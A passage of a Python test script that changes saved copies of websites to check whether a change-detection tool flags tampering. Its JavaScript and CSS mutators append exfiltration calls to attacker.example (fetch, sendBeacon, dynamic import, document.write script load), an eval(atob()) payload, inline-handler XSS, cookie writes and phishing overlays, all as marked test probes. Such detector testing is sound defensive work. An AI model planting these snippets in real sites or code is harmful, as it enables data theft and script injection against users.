        site_id=site_dir.name,
        kind="css",
        pattern="hex_to_rgb",
        file=relpath(target, run_dir),
        expected="edge_case",
        description=f"Replaced #{hex_value} with {rgb} - render identical, bytes differ",
        details={"original_hex": f"#{hex_value}", "new_rgb": rgb},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_before_content_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Append a `body::before` rule with phishing text content.

    Pseudo-elements (`::before`, `::after`) bypass the naive regex
    parser because the selector contains colons. This mutation documents
    that gap: the file-level content diff WILL flag, but the per-rule
    diff produces zero records. Edge case.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "before_content_injection", "no .css files")
    appended = (
        "\n/* AFR-TAMPER */\n"
        "body::before { content: 'PHISH-VIA-PSEUDO-ELEMENT'; "
        "position: fixed; top: 0; left: 0; z-index: 9999; "
        "background: red; color: white; padding: 4px; }\n"
    )
    text = target.read_text(encoding="utf-8") + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="before_content_injection",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Appended body::before with phishing content - pseudo-element gap",
        details={"note": "regex parser misses ::before/::after selectors"},
    )


@_prereqs("css_files")
@_prereqs("css_files")
def mutate_css_supports_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Append an `@supports` rule that hides content on modern browsers.

    `@supports` has nested braces, so the naive regex parser can't
    see inside it. The file-level diff still flags. Documents the
    at-rule parsing gap.
    """
    target = largest_file(site_dir / "css", ".css")
    if target is None:
        return skipped(site_dir, "css", "supports_injection", "no .css files")
    appended = (
        "\n/* AFR-TAMPER */\n"
        "@supports (display: grid) {\n"
        "  .gi-link, .gi-button-primary { display: none !important; }\n"
        "}\n"
    )
    text = target.read_text(encoding="utf-8") + appended
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="css",
        pattern="supports_injection",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Appended @supports rule with display:none - at-rule gap",
        details={"note": "regex parser misses nested @supports braces"},
    )


# ------------------------------------------------------------------------- #
# JS mutations (3 patterns)                                                 #
# ------------------------------------------------------------------------- #


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_marker_function(site_dir: Path, run_dir: Path) -> Mutation:
    """Append a marker comment + noop function to the largest JS file.

    Pure append - safe even on minified code. Asset comparator detects
    file content drift. Should flag.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "marker_function", "no .js files")
    appended = (
        f"\n// {TAMPER_TAG}-MARKER\n"
        'function __afrTamperMarker() { return "afr-tamper-test"; }\n'
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="marker_function",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended marker comment + noop function",
        details={"appended": appended.strip()},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_behavior_change(site_dir: Path, run_dir: Path) -> Mutation:
    """Flip a comparison operator: `===` → `!==` (BEHAVIOR change, not noise).

    Real bug injection. The bytes change is small (`===` vs `!==`) but
    the runtime behavior inverts. Should flag.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "behavior_change", "no .js files")
    text = target.read_text(encoding="utf-8")
    # Try operators in priority order. `===` is the most common safe target;
    # `<` / `>` could be inside JSX-like constructs in some files.
    swaps: list[tuple[str, str]] = [("===", "!=="), ("!==", "==="), ("==", "!=")]
    applied = None
    for old, new in swaps:
        idx = text.find(old)
        if idx != -1:
            text = text[:idx] + new + text[idx + len(old) :]
            applied = {"flipped": f"{old} → {new}", "offset": idx}
            break
    if not applied:
        return skipped(
            site_dir, "js", "behavior_change", "no === / !== / == operator found"
        )
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="behavior_change",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Flipped a comparison operator (real behavior regression)",
        details=applied,
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_format_only(site_dir: Path, run_dir: Path) -> Mutation:
    """Add whitespace + newlines without changing logic.

    Edge case: AST is unchanged, behavior is unchanged, only the bytes
    differ. A content-diff (asset comparator) flags this; an AST-aware
    diff would not. Documents framework stance: any noisy reformat
    (e.g., switching minifier versions) WILL surface as a flagged
    change.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "format_only", "no .js files")
    text = target.read_text(encoding="utf-8")
    # Insert a newline after every `;` - cosmetic, cannot affect ASI
    # (Automatic Semicolon Insertion) since the semis are already there.
    new_text = text.replace(";", ";\n")
    if new_text == text:
        return skipped(site_dir, "js", "format_only", "no `;` to expand")
    target.write_text(new_text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="format_only",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Added newlines after every `;` - bytes differ, AST identical",
        details={"newlines_inserted": text.count(";")},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_fetch_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
    """Find a fetch()/XHR/axios URL string and swap it to attacker.example.

    Data-exfil vector: the page POSTs sensitive data (form submissions,
    analytics events, etc.) and an attacker who controls the JS swaps
    the destination. Detection relies on file-level content diff
    catching the URL string change inside the JS body.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "fetch_url_swap", "no .js files")
    text = target.read_text(encoding="utf-8")
    # Swap the first absolute URL found in a string literal. Match
    # http(s):// inside single OR double quotes.
    pat = re.compile(r"""(["'])(https?://[^"'\s]+)\1""")
    m = pat.search(text)
    if m is None:
        # Append a new fetch() call as a fallback.
        appended = (
            "\n// AFR-TAMPER-FETCH-SWAP\n"
            "if (typeof fetch !== 'undefined') {\n"
            "  fetch('https://attacker.example/exfil', "
            "{method: 'POST', body: 'data'});\n"
            "}\n"
        )
        text = text + appended
        target.write_text(text, encoding="utf-8")
        return Mutation(
            site_id=site_dir.name,
            kind="js",
            pattern="fetch_url_swap",
            file=relpath(target, run_dir),
            expected="should_flag",
            description="Appended fetch() to attacker URL (no existing URL to swap)",
            details={"appended": True},
        )
    quote = m.group(1)
    original = m.group(2)
    new_url = f"{quote}https://attacker.example/exfil{quote}"
    text = text[: m.start()] + new_url + text[m.end() :]
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="fetch_url_swap",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Swapped first URL string in JS to attacker - data exfil",
        details={
            "original": _preview(original, 80),
            "new": "https://attacker.example/exfil",
        },
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_eval_added(site_dir: Path, run_dir: Path) -> Mutation:
    """Append an eval() call - classic XSS / arbitrary-code pattern.

    Real attack pattern: encoded payload + eval to bypass naive
    static analysis. Should always flag because the bytes differ
    (and the marker AFR-TAMPER-EVAL is unique enough to grep for).
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "eval_added", "no .js files")
    appended = (
        "\n// AFR-TAMPER-EVAL\n"
        "(function(){ var p = 'YWxlcnQoIkFGUi1UQU1QRVItRVZBTCIp'; "
        "try { eval(atob(p)); } catch (e) {} })();\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="eval_added",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended eval(atob(...)) - arbitrary code execution",
        details={"pattern": "eval+base64-decoded payload"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_document_write_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `document.write('<script src=attacker>')` - DOM-write XSS.

    Real attack: `document.write` evaluates HTML and runs scripts. A
    single line in legitimate JS can pull in arbitrary attacker code.
    Caught via file-content diff.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "document_write_injection", "no .js files")
    appended = (
        "\n// AFR-TAMPER-DOC-WRITE\n"
        "if (typeof document !== 'undefined' && document.write) {\n"
        '  document.write(\'<script src="https://attacker.example/x.js">'
        "<\\/script>');\n"
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="document_write_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended document.write(<script src=attacker>) - DOM-write XSS",
        details={"vector": "document.write"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_innerhtml_write(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `el.innerHTML = '<img src=x onerror=...>'` - innerHTML XSS.

    Setting innerHTML to attacker-controlled HTML executes inline
    handlers. Classic XSS vector that bypasses CSP `script-src` if
    the inline handler is allowed.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "innerhtml_write", "no .js files")
    appended = (
        "\n// AFR-TAMPER-INNERHTML\n"
        "if (typeof document !== 'undefined') {\n"
        "  var el = document.body || document.documentElement;\n"
        "  if (el) {\n"
        "    el.insertAdjacentHTML('beforeend', "
        "'<img src=x onerror=\"alert(\\'AFR-TAMPER-XSS\\')\">');\n"
        "  }\n"
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="innerhtml_write",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended insertAdjacentHTML with onerror - inline-handler XSS",
        details={"vector": "insertAdjacentHTML"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_localstorage_write(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `localStorage.setItem('afr_tamper', 'X')` - state pollution.

    Local storage writes by attacker-controlled JS can:
      - poison saved app state (next page load reads bad state)
      - exfiltrate session data via the localStorage event
      - persist tracking IDs across sessions
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "localstorage_write", "no .js files")
    appended = (
        "\n// AFR-TAMPER-LOCALSTORAGE\n"
        "if (typeof localStorage !== 'undefined') {\n"
        "  try { localStorage.setItem('afr_tamper_track', "
        "Date.now().toString()); } catch (e) {}\n"
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="localstorage_write",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended localStorage.setItem - state pollution / tracking",
        details={"vector": "localStorage.setItem"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_cookie_write(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `document.cookie = 'afr_tamper=...'` - cookie injection.

    Setting document.cookie can:
      - inject session-fixation cookies
      - leak tracking IDs
      - overwrite legitimate auth cookies (CSRF helper)
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "cookie_write", "no .js files")
    appended = (
        "\n// AFR-TAMPER-COOKIE\n"
        "if (typeof document !== 'undefined') {\n"
        "  try { document.cookie = 'afr_tamper_track=' + Date.now() + "
        "'; path=/'; } catch (e) {}\n"
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="cookie_write",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended document.cookie write - tracking/session-fixation",
        details={"vector": "document.cookie"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_settimeout_string_eval(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `setTimeout("malicious", 0)` - eval-equivalent attack.

    The string form of setTimeout/setInterval evaluates the string as
    code (same as eval, just deferred). Bypasses naive `eval(`-grep
    static analysis. Should flag because content diff catches the
    addition of the new code.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "settimeout_string_eval", "no .js files")
    appended = (
        "\n// AFR-TAMPER-SETTIMEOUT-EVAL\n"
        "try { setTimeout(\"console.log('AFR-TAMPER-SETTIMEOUT-EVAL')\", 0); }\n"
        "catch (e) {}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="settimeout_string_eval",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended setTimeout(string) - eval-equivalent code execution",
        details={"vector": "setTimeout-string-form"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_string_literal_swap(site_dir: Path, run_dir: Path) -> Mutation:
    """Find a string literal not part of a URL and swap its content.

    Real bug class: a user-facing error message swap, an API endpoint
    typo, a localization string mutation. Caught by file-content diff.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "string_literal_swap", "no .js files")
    text = target.read_text(encoding="utf-8")
    # Match a quoted string of 5-50 chars that doesn't look like a URL.
    pat = re.compile(r"""(["'])([^"'<>\\]{5,50})\1""")
    for m in pat.finditer(text):
        value = m.group(2)
        if value.startswith(("http", "//", "/")) or "://" in value:
            continue  # likely a URL - skip; URL swaps are tested elsewhere
        if value.startswith("AFR-"):
            continue  # already a tamper marker
        new_text = (
            text[: m.start()]
            + m.group(1)
            + "AFR-TAMPER-STRING"
            + m.group(1)
            + text[m.end() :]
        )
        target.write_text(new_text, encoding="utf-8")
        return Mutation(
            site_id=site_dir.name,
            kind="js",
            pattern="string_literal_swap",
            file=relpath(target, run_dir),
            expected="should_flag",
            description=(
                f"Swapped JS string literal {_preview(value, 40)!r} → "
                '"AFR-TAMPER-STRING"'
            ),
            details={"original": _preview(value, 60), "new": "AFR-TAMPER-STRING"},
        )
    return skipped(site_dir, "js", "string_literal_swap", "no eligible string literal")


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_numeric_constant_change(site_dir: Path, run_dir: Path) -> Mutation:
    """Find and tweak a numeric constant. Real bug class.

    A timeout `setTimeout(fn, 1000)` accidentally becoming `setTimeout
    (fn, 100)` would break UX subtly. Or a price/quantity constant
    silently changing. Caught via file-content diff.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "numeric_constant_change", "no .js files")
    text = target.read_text(encoding="utf-8")
    # Match a 3+ digit integer that's not part of a longer token (not
    # inside a longer number, not part of an identifier). Conservative
    # to avoid corrupting hex literals or version strings.
    pat = re.compile(r"(?<![\w.])(\d{3,6})(?![\w.])")
    m = pat.search(text)
    if m is None:
        return skipped(
            site_dir, "js", "numeric_constant_change", "no 3-6 digit constant"
        )
    original = int(m.group(1))
    # Multiply by ~1.5 then round - meaningfully different but same magnitude.
    new_val = original + 1
    text = text[: m.start()] + str(new_val) + text[m.end() :]
    target.write_text(text, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="numeric_constant_change",
        file=relpath(target, run_dir),
        expected="should_flag",
        description=f"Bumped a numeric constant {original}→{new_val} - subtle behavior bug",
        details={"original": original, "new": new_val, "offset": m.start()},
    )


@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_import_dynamic(site_dir: Path, run_dir: Path) -> Mutation:
    """Append a dynamic `import()` to an attacker-controlled module.

    Modern JS vector: `import()` loads and executes code at runtime.
    Bypasses static analysis that only looks at top-level imports.
    The per-function regex parser will miss this (it's not a function
    declaration), but the file-level content diff catches it.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "import_dynamic", "no .js files")
    appended = (
        "\n// AFR-TAMPER-IMPORT\n"
        "if (typeof import !== 'undefined') {\n"
        "  import('https://attacker.example/malicious-module.js')\n"
        "    .then(m => console.log('AFR-TAMPER-IMPORT', m))\n"
        "    .catch(e => {});\n"
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="import_dynamic",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended dynamic import() to attacker module - modern JS vector",
        details={"vector": "dynamic-import"},
    )


@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
@_prereqs("js_files")
def mutate_js_sendbeacon(site_dir: Path, run_dir: Path) -> Mutation:
    """Append `navigator.sendBeacon()` to an attacker URL.

    Analytics exfiltration vector: sendBeacon fires a reliable,
    background POST that outlives the page. Used by real trackers
    and equally useful to attackers for data exfiltration.
    """
    target = largest_file(site_dir / "js", ".js")
    if target is None:
        return skipped(site_dir, "js", "sendbeacon", "no .js files")
    appended = (
        "\n// AFR-TAMPER-SEND_BEACON\n"
        "if (typeof navigator !== 'undefined' && navigator.sendBeacon) {\n"
        '  navigator.sendBeacon("https://attacker.example/beacon", '
        '"AFR-TAMPER-DATA");\n'
        "}\n"
    )
    with target.open("a", encoding="utf-8") as f:
        f.write(appended)
    return Mutation(
        site_id=site_dir.name,
        kind="js",
        pattern="sendbeacon",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Appended navigator.sendBeacon to attacker URL - analytics exfil",
        details={"vector": "navigator.sendBeacon"},
    )


# ------------------------------------------------------------------------- #
# Driver                                                                    #
# ------------------------------------------------------------------------- #


# PLAN: each entry = (site_index_0_based, [mutator, ...], label).
#
# Site index N maps to numeric site dir N+1 (sites are sorted
# numerically). Multiple mutators per site let us pack 30+ distinct
# probes into 20 sites by grouping mutations that exercise related
# detection paths (e.g., all phishing-class HTML attacks on one site,
# all CSS semantic-equivalent rewrites on another).
#
# Per-site grouping convention: mutations on the same site SHARE the
# same `expected` outcome where possible, so a per-site verdict is
# unambiguous. Where a site groups must-flag + edge-case mutations
# together, the most-conservative `expected` reflects that.
PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
    # ---- Visual (4 sites, 5 patterns) -----------------------------
    (0, [mutate_visual_drastic], "visual:drastic"),
    # Site 2 groups two should-flag visuals: subtle text overlay
    # exercises low-area-but-high-contrast detection; multiple small
    # regions exercises contour aggregation.
    (
        1,
        [mutate_visual_subtle_text, mutate_visual_multiple_small_regions],
        "visual:subtle+multi_regions",
    ),
    (
        2,
        [mutate_visual_color_shift, mutate_visual_transparent_overlay],
        "visual:global",
    ),
    (3, [mutate_visual_tiny_corner], "visual:tiny_corner_edge"),
    # ---- HTML (10 sites, 18 patterns) ----------------------------
    (4, [mutate_html_marker_div], "html:marker_div"),
    (
        5,
        [mutate_html_attributes, mutate_html_open_graph_meta],
        "html:attributes_global+og",
    ),
    # PHISHING bundle: all the URL-target hijack attacks on one site.
    (
        6,
        [
            mutate_html_href_hijack,
            mutate_html_form_action_hijack,
            mutate_html_img_src_swap,
            mutate_html_picture_source,
        ],
        "html:phishing_bundle+responsive",
    ),
    # XSS via <script> tag (external + inline) + <style>-block content
    # injection (CSS-in-HTML XSS vector that bypasses css/ file diff).
    (
        7,
        [
            mutate_html_script_injection,
            mutate_html_style_block_content,
            mutate_html_svg_injection,
        ],
        "html:xss_script_tag+style_block+svg",
    ),
    # XSS-via-attribute: onclick + inline style. Probes a known framework
    # gap (no `on*` attribute tracking yet).
    (
        8,
        [
            mutate_html_inline_event_handler,
            mutate_html_inline_style_injection,
            mutate_html_canvas_injection,
        ],
        "html:xss_inline_attrs+canvas",
    ),
    # URL-rewrite class: <base> hijack + hidden iframe + meta refresh
    # auto-redirect. All three rewrite where the user/browser ends up.
    (
        9,
        [
            mutate_html_base_tag_injection,
            mutate_html_iframe_injection,
            mutate_html_meta_http_equiv_refresh,
            mutate_html_noscript_injection,
        ],
        "html:url_rewrite+noscript",
    ),
    (10, [mutate_html_critical_text], "html:critical_text"),
    # SECURITY-DOWNGRADE: SRI + rel + CSP strips, plus a11y aria strip.
    # All "remove a defense" mutations clustered together.
    (
        11,
        [
            mutate_html_integrity_strip,
            mutate_html_rel_nofollow_strip,
            mutate_html_csp_meta_strip,
            mutate_html_aria_strip,
        ],
        "html:security_downgrade",
    ),
    # SEO + invisible content (edge_case bundle).
    (12, [mutate_html_meta_tags, mutate_html_hidden_content], "html:seo+hidden"),
    # ---- CSS (4 sites, 14 patterns) -------------------------------
    # Real-value bundle: color, !important, media-query.
    (
        13,
        [mutate_css_color_change, mutate_css_important, mutate_css_media_query],
        "css:real_values",
    ),
    # Behavioral CSS: variables + keyframes (cascade-wide impact) +
    # @import + @font-face URL hijacks (supply chain via CSS).
    (
        14,
        [
            mutate_css_variable_change,
            mutate_css_keyframe_change,
            mutate_css_import_url_swap,
            mutate_css_font_face_url_swap,
            mutate_css_before_content_injection,
        ],
        "css:behavior+supply_chain+pseudo",
    ),
    # Hide-content / interfere-with-interaction via CSS rules.
    (
        15,
        [
            mutate_css_display_none_added,
            mutate_css_opacity_invisible,
            mutate_css_pointer_events_none,
        ],
        "css:hide_or_block",
    ),
    # Edge cases: semantically equivalent / order-only changes.
    (
        16,
        [
            mutate_css_equivalent_rewrite,
            mutate_css_property_reorder,
            mutate_css_hex_to_rgb,
            mutate_css_rule_reorder,
            mutate_css_supports_injection,
        ],
        "css:equiv_edge_cases+at_rule",
    ),
    # ---- JS (3 sites, 13 patterns) --------------------------------
    # Behavior change bundle: comparison flip + numeric constant +
    # string literal swap (subtle behavior bugs).
    (
        17,
        [
            mutate_js_behavior_change,
            mutate_js_numeric_constant_change,
            mutate_js_string_literal_swap,
        ],
        "js:behavior_changes",
    ),
    # Security probes: every JS-side attack vector we can synthesize
    # in one place. Grouped so the audit can verify "all attack
    # vectors recognized" in a single drill-in.
    (
        18,
        [
            mutate_js_fetch_url_swap,
            mutate_js_eval_added,
            mutate_js_settimeout_string_eval,
            mutate_js_document_write_injection,
            mutate_js_innerhtml_write,
            mutate_js_localstorage_write,
            mutate_js_cookie_write,
            mutate_js_marker_function,
            mutate_js_format_only,
            mutate_js_import_dynamic,
            mutate_js_sendbeacon,
        ],
        "js:security+sanity+modern",
    ),
    # NOTE: this packs ~40 distinct mutations across 19 active sites.
    # Site index 19 (numeric site "20") is intentionally OMITTED from
    # PLAN so it stays as the untouched control - the framework's
    # most important invariant ("zero changes → zero detections").
]


# ------------------------------------------------------------------------- #
# Preflight scan                                                            #
# ------------------------------------------------------------------------- #
#
# Each mutator skips() gracefully when its target markup isn't present
# (e.g. mutate_html_form_action_hijack skips when the page has no
# <form action>). Skips are silent in the manifest's mutation list -
# easy to overlook when porting the script to a new site set whose pages
# don't share the same markup as the original gov.ie URLs the script
# was authored against.
#
# The preflight introspects each site's index.html + css/ + js/ and
# computes which planned mutators WILL skip BEFORE applying anything.
# Result is printed to stderr (operator-visible) and recorded in the
# manifest under `preflight` + `expected_skips_due_to_missing_prereqs`.


# Regex patterns the preflight greps index.html for.
_PREREQ_PATTERNS: dict[str, str] = {
    "head_open": r"<head\b",
    "head_close": r"</head>",
    "a_with_attrs": r"<a\s",
    "a_href": r'<a\s[^>]*\bhref=',
    "form_action": r'<form\s[^>]*\baction=',
    "img_src": r'<img\s[^>]*\bsrc=',
    "script_integrity": r'\bintegrity="',
    "aria_attr": r'\baria-(?:label|labelledby|describedby|hidden|live)=',
    "rel_nofollow_etc": r'\brel="(?:nofollow|noopener|noreferrer)',
    "h1_or_h2": r"<h[12][\s>]",
    "h1_h2_h3": r"<h[1-3][\s>]",
}


def preflight_scan(site_dir: Path) -> dict[str, bool]:
    """Return the prerequisite-availability map for one site.

    Each key is a prereq token. True means a mutator depending on that
    prereq will land; False means it will skip().
    """
    css_dir = site_dir / "css"
    js_dir = site_dir / "js"
    result: dict[str, bool] = {
        "screenshot_png": (site_dir / "screenshot.png").exists(),
        "index_html": (site_dir / "index.html").exists(),
        "css_files": css_dir.exists() and any(css_dir.glob("*.css")),
        "js_files": js_dir.exists() and any(js_dir.glob("*.js")),
    }
    for key in _PREREQ_PATTERNS:
        result[key] = False
    if result["index_html"]:
        try:
            html = (site_dir / "index.html").read_text(
                encoding="utf-8", errors="ignore"
            )
        except OSError:
            return result
        for key, pat in _PREREQ_PATTERNS.items():
            if re.search(pat, html, re.IGNORECASE):
                result[key] = True
    return result


def compute_expected_skips(
    sites: list[Path],
    plan: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]],
) -> tuple[dict[str, dict[str, bool]], list[dict[str, Any]]]:
    """Predict which planned mutators will skip due to missing prereqs.

    Returns (preflight_per_site, list_of_expected_skip_rows). An empty
    skip list means every planned mutator should land cleanly.
    """
    preflight: dict[str, dict[str, bool]] = {
        site.name: preflight_scan(site) for site in sites
    }
    skips: list[dict[str, Any]] = []
    for site_idx, mutator_list, label in plan:
        if site_idx >= len(sites):
            continue
        site = sites[site_idx]
        prereqs = preflight[site.name]
        for mutator in mutator_list:
            needed = getattr(mutator, "prereqs", [])
            missing = [k for k in needed if not prereqs.get(k, False)]
            if missing:
                skips.append(
                    {
                        "site_id": site.name,
                        "bundle": label,
                        "pattern": mutator.__name__.removeprefix("mutate_"),
                        "missing_prereqs": missing,
                    }
                )
    return preflight, skips


def _check_already_tampered(run_dir: Path) -> list[str]:
    """Scan the run dir for `AFR-TAMPER` markers from a previous tamper.

    Returns a list of relative paths where markers were found (capped at
    5 for readable error output). Empty list means the baseline is clean.

    The marker `AFR-TAMPER` is unique enough that grep'ing for it in
    HTML/CSS/JS/screenshot-metadata yields zero false positives on real
    crawled content.
    """
    found: list[str] = []
    # Walk only HTML/CSS/JS/JSON files - tamper markers don't land in
    # binary files. PNG screenshots can't carry the text marker, so
    # skipping binaries is safe AND keeps the scan fast.
    for path in run_dir.rglob("*"):
        if not path.is_file():
            continue
        if path.suffix not in (".html", ".css", ".js", ".json", ".txt"):
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        if TAMPER_TAG in text:
            found.append(str(path.relative_to(run_dir.parent.parent)))
            if len(found) >= 5:
                break
    return found


def main() -> None:
    run_dir = resolve_run_dir()

    # Refuse to re-tamper an already-tampered baseline. Re-running the
    # script stacks mutations (each run prepends `[CRITICAL]` to a
    # heading, appends another marker function, etc.) - operator-
    # confusing pollution that's bitten us during the audit. Override
    # with AFR_TAMPER_FORCE=1 if the operator REALLY wants to stack.
    if os.environ.get("AFR_TAMPER_FORCE", "").lower() not in ("1", "true", "yes"):
        existing = _check_already_tampered(run_dir)
        if existing:
            print(
                f"FATAL: baseline at {run_dir} already contains "
                f"`{TAMPER_TAG}` markers - this script is not idempotent "
                "and re-running stacks mutations (e.g. doubles the "
                "[CRITICAL] heading prefix, appends a second marker "
                "function, etc.).\n\n"
                "Sample marker locations (up to 5):",
                file=sys.stderr,
            )
            for p in existing:
                print(f"  - {p}", file=sys.stderr)
            print(
                "\nFix one of these ways:\n"
                "  1. Re-run baseline (preferred): on /runs, check the "
                "session and click 'Re-run baseline (1)'. Then re-run "
                "this script against the fresh baseline.\n"
                "  2. Force stacking (NOT RECOMMENDED): "
                "AFR_TAMPER_FORCE=1 cat scripts/tamper_baseline.py | "
                "docker exec -i test_ui_with_ai-dashboard-1 python -",
                file=sys.stderr,
            )
            sys.exit(2)

    sites = site_dirs_sorted(run_dir)
    # PLAN site indices used (the active-mutation sites). The largest
    # index + 1 is the intended control - the script reserves THAT site
    # as the untouched control. So the plan needs (max_idx + 1) + 1 sites
    # in total: N for mutations + 1 for control.
    plan_max_site_idx = max((idx for idx, _, _ in PLAN), default=-1)
    intended_control_idx = plan_max_site_idx + 1
    sites_needed = intended_control_idx + 1
    if len(sites) < sites_needed:
        print(
            f"WARN: only {len(sites)} site dirs available; plan needs "
            f"{sites_needed} ({len(PLAN)} mutation sites + 1 control). "
            f"Sites beyond #{len(sites)} will be skipped, including "
            f"the intended control site #{intended_control_idx + 1}. "
            "The audit will be PARTIAL - re-run after `make baseline` "
            "completes the full URL set.",
            file=sys.stderr,
        )

    # Preflight: surface mutators that WILL skip BEFORE we run them, so
    # the operator notices coverage holes when porting the script to a
    # new site set whose pages don't share the markup the script was
    # authored against (e.g. no <form action>, no integrity= attrs).
    preflight, expected_skips = compute_expected_skips(sites, PLAN)
    if expected_skips:
        print(
            f"PREFLIGHT: {len(expected_skips)} planned mutator(s) will "
            "skip due to missing prereqs in the assigned site:",
            file=sys.stderr,
        )
        for s in expected_skips[:15]:
            print(
                f"  - site {s['site_id']} ({s['bundle']}): "
                f"{s['pattern']} skips - missing "
                f"{', '.join(s['missing_prereqs'])}",
                file=sys.stderr,
            )
        if len(expected_skips) > 15:
            print(
                f"  ... and {len(expected_skips) - 15} more "
                "(see manifest's expected_skips_due_to_missing_prereqs)",
                file=sys.stderr,
            )

    mutations: list[Mutation] = []
    bundles_skipped: list[tuple[int, str]] = []  # (site_idx, label) pairs
    for site_idx, mutator_list, label in PLAN:
        if site_idx >= len(sites):
            bundles_skipped.append((site_idx, label))
            continue
        site_dir = sites[site_idx]
        # Multiple mutators can target the same site (e.g., the
        # `html:phishing_bundle` site applies href + form_action +
        # img_src all at once). Each mutator's outcome is recorded
        # independently in the manifest.
        for mutator in mutator_list:
            try:
                mutations.append(mutator(site_dir, run_dir))
            except Exception as e:
                mutations.append(
                    Mutation(
                        site_id=site_dir.name,
                        kind=label.split(":")[0],
                        pattern=label.split(":", 1)[1],
                        file=str(site_dir),
                        expected="should_not_flag",
                        description=f"FATAL during mutation: {type(e).__name__}: {e}",
                        details={"error": str(e)},
                    )
                )

    # Compute control: the INTENDED control is the slot just past the
    # highest plan index. If that slot exists in the actual sites list
